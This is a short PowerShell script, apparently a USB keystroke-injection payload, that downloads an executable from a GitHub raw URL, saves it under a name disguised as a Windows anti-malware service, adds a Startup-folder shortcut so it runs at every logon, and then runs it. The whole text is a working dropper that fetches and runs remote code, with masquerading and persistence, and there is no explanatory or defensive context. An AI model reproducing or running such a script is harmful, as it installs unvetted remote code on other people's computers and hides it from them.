mkdir $env:USERPROFILE\AppData\AntiMalwareCoreServices
Remove-Item $env:USERPROFILE\AppData\AntiMalwareCoreServices\Anti-MalwareCoreServices.exe -Force
curl.exe https://raw.githubusercontent.com/e30301/usbHIDscripts/refs/heads/main/payloads/AntiMalwareCoreServices.exe --output $env:USERPROFILE\AppData\AntiMalwareCoreServices\Anti-MalwareCoreServices.exe
$e="$env:USERPROFILE\AppData\AntiMalwareCoreServices\Anti-MalwareCoreServices.exe";$s=[Environment]::GetFolderPath("Startup");$w=New-Object -ComObject WScript.Shell;$l=$w.CreateShortcut((Join-Path $s "Anti-MalwareCoreServices.lnk"));$l.TargetPath=$e;$l.WorkingDirectory=Split-Path $e;$l.Save()
& "$env:USERPROFILE\AppData\AntiMalwareCoreServices\Anti-MalwareCoreServices.exe"
